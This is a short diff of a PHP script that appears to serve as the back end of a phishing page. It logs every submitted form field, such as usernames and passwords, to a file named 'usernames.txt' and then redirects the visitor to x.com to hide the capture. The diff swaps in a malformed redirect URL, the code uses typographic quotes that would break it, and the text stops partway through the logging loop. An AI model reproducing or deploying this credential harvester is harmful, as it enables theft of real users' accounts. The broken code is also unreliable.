@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http://www.x.com/’);
+header (‘Location:http://https://x.com/?lang=en/’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
